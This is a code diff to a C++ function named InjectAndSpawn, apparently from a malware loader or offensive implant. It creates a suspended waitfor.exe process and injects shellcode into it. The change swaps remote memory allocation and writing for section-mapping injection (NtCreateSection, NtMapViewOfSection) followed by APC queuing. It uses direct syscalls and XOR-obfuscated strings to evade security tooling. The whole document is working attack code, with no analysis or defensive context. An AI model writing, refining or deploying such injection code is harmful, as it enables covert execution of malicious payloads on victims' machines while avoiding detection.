@@ -11,7 +11,9 @@ DWORD InjectAndSpawn(shared_func_pointers* fp, logger_ctx* log_ctx) {
     HANDLE h_process = NULL;
     HANDLE h_thread = NULL;
     LPVOID local_shellcode = NULL;
-    LPVOID remote_shellcode = NULL;
+    HANDLE h_section = NULL;
+    PVOID  local_view = NULL;
+    PVOID  remote_view = NULL;
 
     result = InitSyscalls();
     if (result != ERROR_SUCCESS) {
@@ -81,61 +83,72 @@ DWORD InjectAndSpawn(shared_func_pointers* fp, logger_ctx* log_ctx) {
 
         AesLogger::LogInfo(log_ctx, XorString("Created suspended waitfor.exe. PID=%d"), process_info.dwProcessId);
 
-        AesLogger::LogDebug(log_ctx, XorString("Allocating remote memory in waitfor.exe."));
+        AesLogger::LogDebug(log_ctx, XorString("Creating shared section."));
         NTSTATUS status;
-        SIZE_T region_size = shellcode_size;
-        remote_shellcode = NULL;
-        status = SysNtAllocateVirtualMemory(
-            h_process,
-            &remote_shellcode,
-            0,
-            &region_size,
-            MEM_COMMIT,
-            PAGE_READWRITE
-        );
-        if (status != 0) {
-            AesLogger::LogError(log_ctx, XorString("NtAllocateVirtualMemory failed. NTSTATUS: 0x%08X"), status);
-            result = status;
-            break;
-        }
+        LARGE_INTEGER section_size;
+        section_size.QuadPart = static_cast<LONGLONG>(shellcode_size);
 
-        AesLogger::LogDebug(log_ctx, XorString("Writing shellcode to remote process at 0x%p."), remote_shellcode);
-        status = SysNtWriteVirtualMemory(
-            h_process,
-            remote_shellcode,
-            local_shellcode,
-            shellcode_size,
+        status = SysNtCreateSection(
+            &h_section,
+            SECTION_ALL_ACCESS,
+            NULL,
+            &section_size,
+            PAGE_EXECUTE_READWRITE,
+            SEC_COMMIT,
             NULL
         );
         if (status != 0) {
-            AesLogger::LogError(log_ctx, XorString("NtWriteVirtualMemory failed. NTSTATUS: 0x%08X"), status);
+            AesLogger::LogError(log_ctx, XorString("NtCreateSection failed. NTSTATUS: 0x%08X"), status);
             result = status;
             break;
         }
 
-        AesLogger::LogDebug(log_ctx, XorString("Changing remote memory to PAGE_EXECUTE_READ."));
-        {
-            PVOID protect_addr = remote_shellcode;
-            SIZE_T protect_size = shellcode_size;
-            ULONG old_protect = 0;
-            status = SysNtProtectVirtualMemory(
-                h_process,
-                &protect_addr,
-                &protect_size,
-                PAGE_EXECUTE_READ,
-                &old_protect
-            );
-            if (status != 0) {
-                AesLogger::LogError(log_ctx, XorString("NtProtectVirtualMemory failed. NTSTATUS: 0x%08X"), status);
-                result = status;
-                break;
-            }
+        AesLogger::LogDebug(log_ctx, XorString("Mapping section into local process."));
+        SIZE_T local_view_size = 0;
+        status = SysNtMapViewOfSection(
+            h_section,
+            (HANDLE)-1,
+            &local_view,
+            0, 0, NULL,
+            &local_view_size,
+            ViewUnmap,
+            0,
+            PAGE_READWRITE
+        );
+        if (status != 0) {
+            AesLogger::LogError(log_ctx, XorString("NtMapViewOfSection (local) failed. NTSTATUS: 0x%08X"), status);
+            result = status;
+            break;
         }
+
+        AesLogger::LogDebug(log_ctx, XorString("Copying shellcode to local view."));
+        memcpy(local_view, local_shellcode, shellcode_size);
+
+        AesLogger::LogDebug(log_ctx, XorString("Mapping section into waitfor.exe."));
+        SIZE_T remote_view_size = 0;
+        status = SysNtMapViewOfSection(
+            h_section,
+            h_process,
+            &remote_view,
+            0, 0, NULL,
+            &remote_view_size,
+            ViewUnmap,
+            0,
+            PAGE_EXECUTE_READ
+        );
+        if (status != 0) {
+            AesLogger::LogError(log_ctx, XorString("NtMapViewOfSection (remote) failed. NTSTATUS: 0x%08X"), status);
+            result = status;
+            break;
+        }
+
+        SysNtUnmapViewOfSection((HANDLE)-1, local_view);
+        local_view = NULL;
 
         AesLogger::LogDebug(log_ctx, XorString("Queuing APC to main thread."));
         status = SysNtQueueApcThread(
             h_thread,
-            remote_shellcode,
+            remote_view,
             NULL,
             NULL,
             NULL
@@ -158,6 +171,12 @@ DWORD InjectAndSpawn(shared_func_pointers* fp, logger_ctx* log_ctx) {
         result = ERROR_SUCCESS;
     } while (false);
 
+    if (local_view) {
+        SysNtUnmapViewOfSection((HANDLE)-1, local_view);
+    }
+    if (h_section) {
+        fp->fp_CloseHandle(h_section);
+    }
     if (h_process) {
         fp->fp_CloseHandle(h_process);
     }
